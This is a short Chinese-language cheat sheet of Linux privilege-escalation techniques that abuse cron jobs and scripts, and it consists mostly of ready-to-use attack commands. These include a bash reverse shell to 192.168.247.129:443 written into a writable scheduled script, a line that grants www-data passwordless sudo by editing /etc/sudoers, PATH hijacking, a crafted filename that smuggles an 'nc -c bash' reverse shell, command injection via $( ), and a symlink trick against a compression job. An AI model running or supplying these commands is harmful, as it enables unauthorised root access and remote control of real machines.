# 🥰 计划任务&脚本类

1. 运行的脚本&文件直接可写

```bash
1. 反弹
exho '#!/bin/bash\nbash -i >& /dev/tcp/192.168.247.129/443 0>&1\n' >> /tmp/update
chmod +x /tmp/update

2. 赋权用户
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
chmod +x /tmp/update
```

1. 调用脚本的运行路径是否绝对，如果不绝对

就先写一个bash脚本进脚本而后环境变量挟持

```bash
echo '#!/bin/bash\nbash -i >& /dev/tcp/192.168.247.129/443 0>&1\n' > /tmp/xxx.sh

export PATH=/tmp:$PATH
```

1. **脚本exec等执行命令中存在$path等变量**

```bash
去到$path地方，建一个；文件，而后写入命令即可，命令如下

touch '; nc 10.10.xx.xx 1338 -c bash'
```

1. 高权限脚本可以输入选项

```bash
直接输入bash尝试
```

1. 高权限py文件夹带或可输入选项

```bash
测试：10.10.10.$(echo 7)
执行：$(/tmp/d.sh)（d.sh是恶意payload）
```

1. 计划任务是压缩

如果命令完备不存在路径问题，那么可以考虑软链接的方式\
首先要在被压缩的目录中找到一个可写的目录\
find . -writable\
而后

```bash
ln -s /home/luis/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/
```

‍
